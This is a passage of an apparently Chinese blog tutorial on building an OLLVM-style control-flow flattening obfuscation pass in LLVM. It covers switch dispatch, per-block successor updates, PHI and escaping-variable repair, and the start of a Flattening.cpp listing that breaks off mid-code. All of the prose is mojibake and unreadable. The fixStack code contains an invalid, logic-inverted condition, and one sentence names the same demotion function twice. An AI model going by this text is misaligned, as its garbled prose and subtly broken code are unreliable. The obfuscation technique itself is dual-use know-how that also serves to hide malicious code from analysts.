æŒ‡ä»¤å®ç°åˆ†å‘åŠŸèƒ½ã€‚</p><p>å°†åŸåŸºæœ¬å—ç§»åŠ¨åˆ°è¿”å›å—ä¹‹å‰ï¼Œå¹¶åˆ†é…éšæœºçš„ case å€¼ï¼Œå¹¶å°†å…¶æ·»åŠ åˆ° switch æŒ‡ä»¤çš„åˆ†æ”¯ä¸­ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215160649347.png" alt="image-20230215160649347"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åœ¨å…¥å£å—æ’å…¥ alloca å’Œ store æŒ‡ä»¤åˆ›å»ºå¹¶åˆå§‹åŒ– switch å˜é‡ï¼Œåˆå§‹å€¼ä¸ºéšæœºå€¼</span></span><br><span class="line"><span class="type">int</span> randNumCase = <span class="built_in">rand</span>();</span><br><span class="line"><span class="comment">// åœ¨å…¥å£å—è·³è½¬åˆ†å‘å—æŒ‡ä»¤ï¼ˆbrDispatchBBï¼‰ä¹‹å‰æ’å…¥ä¸€æ¡ç”³è¯·åˆ†é…å†…å­˜çš„æŒ‡ä»¤ï¼Œä½¿ç”¨ AllocaInst çš„æ„é€ å‡½æ•°</span></span><br><span class="line">AllocaInst *swVarPtr = <span class="keyword">new</span> <span class="built_in">AllocaInst</span>(TYPE_I32, <span class="number">0</span>, <span class="string">&quot;swVar.ptr&quot;</span>, brDispatchBB);</span><br><span class="line"><span class="comment">// åœ¨å…¥å£å—è·³è½¬åˆ†å‘å—æŒ‡ä»¤ï¼ˆbrDispatchBBï¼‰ä¹‹å‰æ’å…¥ä¸€æ¡å†…å­˜å­˜å‚¨çš„æŒ‡ä»¤</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">StoreInst</span>(<span class="built_in">CONST_I32</span>(randNumCase), swVarPtr, brDispatchBB);</span><br><span class="line"><span class="comment">// åœ¨åˆ†å‘å—æ’å…¥ load æŒ‡ä»¤è¯»å– switch å˜é‡</span></span><br><span class="line">LoadInst *swVar = <span class="keyword">new</span> <span class="built_in">LoadInst</span>(TYPE_I32, swVarPtr, <span class="string">&quot;swVar&quot;</span>, <span class="literal">false</span>, dispatchBB);</span><br><span class="line"><span class="comment">// åœ¨è¿”å›å—å‰åˆ›å»º switch é»˜è®¤è·³è½¬çš„åŸºæœ¬å—</span></span><br><span class="line">BasicBlock *swDefault = BasicBlock::<span class="built_in">Create</span>(F.<span class="built_in">getContext</span>(), <span class="string">&quot;seDefault&quot;</span>, &amp;F, returnBB);</span><br><span class="line"><span class="comment">// switch é»˜è®¤è·³è½¬çš„åŸºæœ¬å—é»˜è®¤è·³è½¬åˆ°è¿”å›å—</span></span><br><span class="line">BranchInst::<span class="built_in">Create</span>(returnBB, swDefault);</span><br><span class="line"><span class="comment">// åœ¨åˆ†å‘å—æœ«å°¾çš„ switch å—ä¸­æ·»åŠ  switch æŒ‡ä»¤</span></span><br><span class="line">SwitchInst *swInst = SwitchInst::<span class="built_in">Create</span>(swVar, swDefault, <span class="number">0</span>, dispatchBB);</span><br><span class="line"><span class="comment">// å°†åŸåŸºæœ¬å—æ’å…¥åˆ°è¿”å›å—ä¹‹å‰ï¼Œå¹¶åˆ†é… case å€¼</span></span><br><span class="line"><span class="keyword">for</span>(BasicBlock *BB : origBB)&#123;</span><br><span class="line">    BB-&gt;<span class="built_in">moveBefore</span>(returnBB);</span><br><span class="line">    swInst-&gt;<span class="built_in">addCase</span>(<span class="built_in">CONST_I32</span>(randNumCase), BB);</span><br><span class="line">    randNumCase = <span class="built_in">rand</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>addCase</code>æ–¹æ³•ï¼Œåœ¨åŸºæœ¬å—ä¸­æ·»åŠ å¯¹åº” switch æŒ‡ä»¤çš„ case å€¼ã€‚</p><h3 id="ç¬¬å››æ­¥ï¼šå®ç°è°ƒåº¦å˜é‡è‡ªåŠ¨è°ƒæ•´"><a href="#ç¬¬å››æ­¥ï¼šå®ç°è°ƒåº¦å˜é‡è‡ªåŠ¨è°ƒæ•´" class="headerlink" title="ç¬¬å››æ­¥ï¼šå®ç°è°ƒåº¦å˜é‡è‡ªåŠ¨è°ƒæ•´"></a>ç¬¬å››æ­¥ï¼šå®ç°è°ƒåº¦å˜é‡è‡ªåŠ¨è°ƒæ•´</h3><p>åœ¨æ¯ä¸ªåŸåŸºæœ¬å—æœ€åæ·»åŠ ä¿®æ”¹ switch å˜é‡å€¼çš„æŒ‡ä»¤ï¼Œä»¥ä¾¿è¿”å›åˆ†å‘å—ä¹‹åï¼Œèƒ½å¤Ÿæ­£ç¡®æ‰§è¡Œåˆ°ä¸‹ä¸€ä¸ªåŸºæœ¬å—ã€‚</p><p>åˆ é™¤åŸåŸºæœ¬å—æœ«å°¾çš„è·³è½¬ï¼Œä½¿å…¶ç»“æŸæ‰§è¡Œåè·³è½¬åˆ°è¿”å›å—ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230215161306092.png" alt="image-20230215161306092"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åœ¨æ¯ä¸ªåŸºæœ¬å—æœ€åæ·»åŠ ä¿®æ”¹ switch å˜é‡çš„æŒ‡ä»¤å’Œè·³è½¬åˆ°è¿”å›å—çš„æŒ‡ä»¤</span></span><br><span class="line"><span class="keyword">for</span>(BasicBlock *BB : origBB)&#123;</span><br><span class="line">    <span class="comment">// retn BB</span></span><br><span class="line">    <span class="keyword">if</span>(BB-&gt;<span class="built_in">getTerminator</span>()-&gt;<span class="built_in">getNumSuccessors</span>() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// éæ¡ä»¶è·³è½¬</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(BB-&gt;<span class="built_in">getTerminator</span>()-&gt;<span class="built_in">getNumSuccessors</span>() == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">// è·å–åç»§å—</span></span><br><span class="line">        BasicBlock *sucBB = BB-&gt;<span class="built_in">getTerminator</span>()-&gt;<span class="built_in">getSuccessor</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="comment">// åˆ é™¤åŸºæœ¬å—æœ€åä¸€æ¡è·³è½¬åˆ°åç»§å—çš„æŒ‡ä»¤</span></span><br><span class="line">        BB-&gt;<span class="built_in">getTerminator</span>()-&gt;<span class="built_in">eraseFromParent</span>();</span><br><span class="line">        <span class="comment">// è·å–åç»§å—çš„ case å€¼ï¼Œï¼ˆå¸¸é‡ç±»å‹ï¼‰</span></span><br><span class="line">        ConstantInt *numCase = swInst-&gt;<span class="built_in">findCaseDest</span>(sucBB);</span><br><span class="line">        <span class="comment">// æŠŠ switch å˜é‡ä¿®æ”¹æˆå®ƒçš„åç»§å—çš„ case å€¼ï¼Œä¸‹ä¸€è½®è¿›å…¥åˆ†å‘å—å°±æ ¹æ®è¿™ä¸ªå€¼è·³è½¬åˆ°åç»§å—</span></span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">StoreInst</span>(numCase, swVarPtr, BB);</span><br><span class="line">        <span class="comment">// åŸºæœ¬å—è·³è½¬åˆ°è¿”å›å—</span></span><br><span class="line">        BranchInst::<span class="built_in">Create</span>(returnBB, BB);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// æ¡ä»¶è·³è½¬</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(BB-&gt;<span class="built_in">getTerminator</span>()-&gt;<span class="built_in">getNumSuccessors</span>() == <span class="number">2</span>)&#123;</span><br><span class="line">        ConstantInt *numCaseTrue = swInst-&gt;<span class="built_in">findCaseDest</span>(BB-&gt;<span class="built_in">getTerminator</span>()-&gt;<span class="built_in">getSuccessor</span>(<span class="number">0</span>));</span><br><span class="line">        ConstantInt *numCaseFalse = swInst-&gt;<span class="built_in">findCaseDest</span>(BB-&gt;<span class="built_in">getTerminator</span>()-&gt;<span class="built_in">getSuccessor</span>(<span class="number">1</span>));</span><br><span class="line">        BranchInst *br = <span class="built_in">cast</span>&lt;BranchInst&gt;(BB-&gt;<span class="built_in">getTerminator</span>());</span><br><span class="line">        <span class="comment">// åˆ›å»º select æŒ‡ä»¤åˆ¤æ–­éœ€è¦ä¿®æ”¹å“ªä¸€ä¸ª case å€¼</span></span><br><span class="line">        SelectInst *sel = SelectInst::<span class="built_in">Create</span>(br-&gt;<span class="built_in">getCondition</span>(), numCaseTrue, numCaseFalse, <span class="string">&quot;&quot;</span>, BB-&gt;<span class="built_in">getTerminator</span>());</span><br><span class="line"><span class="comment">// åˆ é™¤åŸºæœ¬å—æœ€åä¸€æ¡è·³è½¬åˆ°åç»§å—çš„æŒ‡ä»¤</span></span><br><span class="line">        BB-&gt;<span class="built_in">getTerminator</span>()-&gt;<span class="built_in">eraseFromParent</span>();</span><br><span class="line"><span class="comment">// æŠŠ switch å˜é‡ä¿®æ”¹æˆå®ƒçš„åç»§å—çš„ case å€¼ï¼Œä¸‹ä¸€è½®è¿›å…¥åˆ†å‘å—å°±æ ¹æ®è¿™ä¸ªå€¼è·³è½¬åˆ°åç»§å—</span></span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">StoreInst</span>(sel, swVarPtr, BB);</span><br><span class="line">        <span class="comment">// åŸºæœ¬å—è·³è½¬åˆ°è¿”å›å—</span></span><br><span class="line">        BranchInst::<span class="built_in">Create</span>(returnBB, BB);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>getNumSuccessors</code>æ–¹æ³•ï¼šè·å–åç»§å—çš„æ•°é‡ã€‚ä¸º 0 è¡¨ç¤ºåç»­åªæœ‰ä¸€æ¡ return æŒ‡ä»¤ï¼›ä¸º 1 è¡¨ç¤ºä¸ºéæ¡ä»¶è·³è½¬ï¼Œåç»­æœ‰ä¸€ä¸ªåç»§å—ï¼›ä¸º 2 è¡¨ç¤ºä¸ºæ¡ä»¶è·³è½¬ï¼Œåç»­æœ‰ä¸¤ä¸ªåç»§å—ã€‚</p><p><code>findCaseDest</code>æ–¹æ³•ï¼šå¯»æ‰¾åŸºæœ¬å—ä¸­ switch case å€¼ï¼Œè¿”å›å€¼ä¸º ConstantInt ç±»å‹ã€‚</p><p><code>getCondition</code>æ–¹æ³•ï¼šè·å–è·³è½¬æ¡ä»¶ã€‚</p><h3 id="ç¬¬äº”æ­¥ï¼šä¿®å¤-PHI-æŒ‡ä»¤å’Œé€ƒé€¸å˜é‡"><a href="#ç¬¬äº”æ­¥ï¼šä¿®å¤-PHI-æŒ‡ä»¤å’Œé€ƒé€¸å˜é‡" class="headerlink" title="ç¬¬äº”æ­¥ï¼šä¿®å¤ PHI æŒ‡ä»¤å’Œé€ƒé€¸å˜é‡"></a>ç¬¬äº”æ­¥ï¼šä¿®å¤ PHI æŒ‡ä»¤å’Œé€ƒé€¸å˜é‡</h3><p>PHI æŒ‡ä»¤çš„å€¼ç”±å‰é©±å—å†³å®šï¼Œå¹³å¦åŒ–åæ‰€æœ‰åŸåŸºæœ¬å—çš„å‰é©±å—éƒ½å˜æˆäº†åˆ†å‘å—ï¼Œå› æ­¤ PHI æŒ‡ä»¤å‘ç”Ÿäº†æŸåã€‚</p><p>é€ƒé€¸å˜é‡æŒ‡åœ¨ä¸€ä¸ªåŸºæœ¬å—ä¸­å®šä¹‰ï¼Œå¹¶ä¸”åœ¨å¦ä¸€ä¸ªåŸºæœ¬å—è¢«å¼•ç”¨çš„å˜é‡ã€‚åœ¨åŸç¨‹åºä¸­æŸäº›åŸºæœ¬å—å¯èƒ½å¼•ç”¨ä¹‹å‰æŸä¸ªåŸºæœ¬å—ä¸­çš„å˜é‡ï¼Œå¹³å¦åŒ–ååŸåŸºæœ¬å—ä¹‹é—´ä¸å­˜åœ¨ç¡®å®šçš„å‰åå…³ç³»ï¼ˆç”±åˆ†å‘å—å†³å®šï¼‰ï¼Œå› æ­¤æŸäº›å˜é‡çš„å¼•ç”¨å¯èƒ½ä¼šæŸåï¼Œåœ¨ç¼–è¯‘æ—¶ä¼šå‡ºç°åˆ†ä¸æ¸…å®šä¹‰å’Œå¼•ç”¨é¡ºåºçš„é—®é¢˜ã€‚</p><p>ä¿®å¤çš„æ–¹æ³•æ˜¯ï¼Œ<strong>è°ƒç”¨<code>DemotePHIToStack</code>ã€<code>DemotePHIToStack</code>è¿™ä¸¤ä¸ªå‡½æ•°å°† PHI æŒ‡ä»¤å’Œé€ƒé€¸å˜é‡éƒ½è½¬åŒ–ä¸ºå†…å­˜å­˜å–æŒ‡ä»¤ï¼ˆallocaã€storeã€loadï¼‰</strong>ã€‚Demote æ˜¯é™çº§çš„æ„æ€ï¼Œ<code>DemoteToStack</code>å°±æ˜¯ç”¨ alloca, store, load ä¸‰ç±»å†…å­˜è®¿é—®æŒ‡ä»¤æ¥ä»£æ›¿ä¹‹å‰çš„ PHI æŒ‡ä»¤ã€‚ä¸ºä»€ä¹ˆæ˜¯ Stack å‘¢ï¼Œå› ä¸º LLVM IR ä¸­çš„ alloca æŒ‡ä»¤æ˜¯åœ¨æ ˆä¸­è¿›è¡Œåˆ†é…çš„ï¼Œè¿™ç‚¹ä¸åŒäºCè¯­è¨€ä¸­çš„ malloc å‡½æ•°ã€‚å°†æ‰€æœ‰ PHI æŒ‡ä»¤ç”¨ä¸‰ç±»å†…å­˜è®¿é—®æŒ‡ä»¤è¡¨ç¤ºï¼Œå¹¶å°†æ‰€æœ‰ alloca æŒ‡ä»¤éƒ½æ”¾åœ¨å…¥å£å—ï¼ŒPHI æŒ‡ä»¤çš„é”™è¯¯å°±è¢«ä¿®å¤äº†ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Flattening::fixStack</span><span class="params">(Function &amp;F)</span></span>&#123;</span><br><span class="line">    vector&lt;PHINode*&gt; origPHI;</span><br><span class="line">    vector&lt;Instruction*&gt; origReg;</span><br><span class="line">    BasicBlock &amp;entryBB = F.<span class="built_in">getEntryBlock</span>();</span><br><span class="line">    <span class="keyword">for</span>(BasicBlock &amp;BB : F)&#123;</span><br><span class="line">        <span class="keyword">for</span>(Instruction &amp;I : BB)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!PHINode *PN = <span class="built_in">dyn_cast</span>&lt;PHINode&gt;(&amp;I))&#123;</span><br><span class="line">                origPHI.<span class="built_in">push_back</span>(PN);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!(<span class="built_in">isa</span>&lt;AllocaInst&gt;(&amp;I) &amp;&amp; I.<span class="built_in">getParent</span>() == &amp;entryBB) &amp;&amp; I.<span class="built_in">isUsedOutsideOfBlock</span>(&amp;BB))&#123;</span><br><span class="line">                origReg.<span class="built_in">push_back</span>(&amp;I);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(PHINode *PN : origPHI)&#123;</span><br><span class="line">        <span class="built_in">DemotePHIToStack</span>(PN, entryBB.<span class="built_in">getTerminator</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(Instruction *I : origReg)&#123;</span><br><span class="line">        <span class="built_in">DemoteRegToStack</span>(*I, entryBB.<span class="built_in">getTerminator</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­é€ƒé€¸å˜é‡ä»£ç åˆ†æï¼š<code>if(!(isa&lt;AllocaInst&gt;(&amp;I) &amp;&amp; I.getParent() == &amp;entryBB) &amp;&amp; I.isUsedOutsideOfBlock(&amp;BB))</code>ï¼š</p><p>æŒ‡ä»¤ I åˆ¤æ–­ä¸ºé€ƒé€¸å˜é‡éœ€è¦åŒæ—¶æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š</p><ul><li>ä¸èƒ½æ˜¯å†…å­˜ç”³è¯·æŒ‡ä»¤ä¸”ä¸åœ¨å…¥å£å—å†…</li><li><code>isUseOutsideOfBlock</code>å‡½æ•°åˆ¤æ–­ä¸ºçœŸï¼Œè¿™ä¸ªå‡½æ•°ç”¨äºåˆ¤æ–­æŒ‡ä»¤ I æ˜¯å¦åœ¨å…¶ä»–åŸºæœ¬å—ä¸­è¢«ä½¿ç”¨</li></ul><p><code>DemotePHIToStack</code>å‡½æ•°ï¼šåœ¨æ ˆä¸Šç”³è¯·ä¸€å—å†…å­˜å­˜æ”¾ phi æŒ‡ä»¤ï¼Œä¿®å¤æ‰€æœ‰å¼•ç”¨äº†å½“å‰æŒ‡ä»¤çš„æŒ‡ä»¤ï¼Œè¿”å›ä¸€ä¸ªæŒ‡é’ˆã€‚</p><p><code>DemoteRegToStack</code>å‡½æ•°ï¼šåœ¨æ ˆä¸Šç”³è¯·ä¸€å—å†…å­˜å­˜æ”¾é€ƒé€¸å˜é‡ï¼Œä¿®å¤æ‰€æœ‰å¼•ç”¨äº†å½“å‰å˜é‡çš„æŒ‡ä»¤ï¼Œè¿”å›ä¸€ä¸ªæŒ‡é’ˆã€‚</p><p>OLLVMä¸­çš„<code>fixStack</code>å‡½æ•°è¿˜å¼•ç”¨äº†ä¸€ä¸ª<code>valueEscape</code>å‡½æ•°ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">valueEscapes</span><span class="params">(Instruction *Inst)</span> </span>&#123;</span><br><span class="line">  BasicBlock *BB = Inst-&gt;<span class="built_in">getParent</span>();</span><br><span class="line">  <span class="keyword">for</span> (Value::use_iterator UI = Inst-&gt;<span class="built_in">use_begin</span>(), E = Inst-&gt;<span class="built_in">use_end</span>(); UI != E;</span><br><span class="line">       ++UI) &#123;</span><br><span class="line">    Instruction *I = <span class="built_in">cast</span>&lt;Instruction&gt;(*UI);</span><br><span class="line">    <span class="keyword">if</span> (I-&gt;<span class="built_in">getParent</span>() != BB || <span class="built_in">isa</span>&lt;PHINode&gt;(I)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (!(<span class="built_in">isa</span>&lt;AllocaInst&gt;(j) &amp;&amp; j-&gt;<span class="built_in">getParent</span>() == bbEntry) &amp;&amp;</span><br><span class="line">            (<span class="built_in">valueEscapes</span>(&amp;*j) || j-&gt;<span class="built_in">isUsedOutsideOfBlock</span>(&amp;*i))) &#123;</span><br><span class="line"> </span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><code>valueEscapes</code>å‡½æ•°æ˜¯ç”¨æ¥åˆ¤æ–­æŒ‡ä»¤ä½¿ç”¨çš„æ“ä½œæ•°ä¸­æ˜¯å¦åŒ…å«é€ƒé€¸å˜é‡ä»¥åŠ PHINodeï¼Œä½†äº‹å®ä¸Šä¿®å¤PHIæŒ‡ä»¤å’Œé€ƒé€¸å˜é‡çš„<code>DemotePHIToStack</code>ä»¥åŠ<code>DemoteRegToStack</code>ä¸¤ä¸ªå‡½æ•°åœ¨ä¿®å¤å½“å‰æŒ‡ä»¤çš„åŒæ—¶è¿˜ä¼šä¿®å¤æ‰€æœ‰å¼•ç”¨äº†å½“å‰æŒ‡ä»¤çš„æŒ‡ä»¤ï¼ˆè¯¦è§llvm&#x2F;lib&#x2F;Transforms&#x2F;Utils&#x2F;DemoteRegToStack.cppæºä»£ç ï¼‰ã€‚</p><blockquote><p><code>DemoteRegisterToMemoryPass</code>è¿™ä¸ª pass å®ç°äº†ä¿®å¤é€ƒé€¸å˜é‡å’Œ PHI æŒ‡ä»¤çš„åŠŸèƒ½ï¼Œå…·ä½“å®ç°åœ¨<code>Reg2Mem.cpp</code>æ–‡ä»¶é‡Œï¼š<a href="%5Bhttp://formalverification.cs.utah.edu/llvm_doxy/2.9/Reg2Mem_8cpp_source.html">Reg2Mem.cppåœ°å€</a></p><p>ä½†æ˜¯æœ¬è´¨ä¸Šå¥½åƒè¿˜æ˜¯è°ƒç”¨<code>valueEscapes</code>ã€<code>DemotePHIToStack</code>ã€<code>DemoteRegToStack</code>è¿™ä¸‰ä¸ªå‡½æ•°æ¥éå†å’Œåˆ¤æ–­æŒ‡ä»¤ï¼Œåªæ˜¯è¢«å°è£…æˆäº†ä¸€ä¸ª passã€‚</p><p>å‚è€ƒï¼š</p><p><a href="https://bbs.kanxue.com/thread-268789-1.htm">https://bbs.kanxue.com/thread-268789-1.htm</a></p><p><a href="https://roife.github.io/2022/02/07/mem2reg/">https://roife.github.io/2022/02/07/mem2reg/</a></p><p><a href="https://blog.csdn.net/yeshahayes/article/details/97018670">https://blog.csdn.net/yeshahayes/article/details/97018670</a></p><p><a href="http://formalverification.cs.utah.edu/llvm_doxy/2.9/Reg2Mem_8cpp_source.html">http://formalverification.cs.utah.edu/llvm_doxy/2.9/Reg2Mem_8cpp_source.html</a></p><p><a href="https://llvm.org/doxygen/DemoteRegToStack_8cpp_source.html">https://llvm.org/doxygen/DemoteRegToStack_8cpp_source.html</a></p><p><a href="https://cloud.tencent.com/developer/inventory/533/article/1645780">https://cloud.tencent.com/developer/inventory/533/article/1645780</a></p></blockquote><h1 id="æ§åˆ¶æµå¹³å¦åŒ–ä»£ç å®ç°"><a href="#æ§åˆ¶æµå¹³å¦åŒ–ä»£ç å®ç°" class="headerlink" title="æ§åˆ¶æµå¹³å¦åŒ–ä»£ç å®ç°"></a>æ§åˆ¶æµå¹³å¦åŒ–ä»£ç å®ç°</h1><h2 id="Flattening-cpp"><a href="#Flattening-cpp" class="headerlink" title="Flattening.cpp"></a>Flattening.cpp</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Support/raw_ostream.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Instructions.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Transforms/Utils.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Support/CommandLine.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Transforms/Utils/Local.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../include/SplitBasicBlock.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../include/Utils.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"><span class="keyword">using</span> std::vector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Flattening</span> : <span class="keyword">public</span> FunctionPass&#123;</span><br><span class="line">        <span 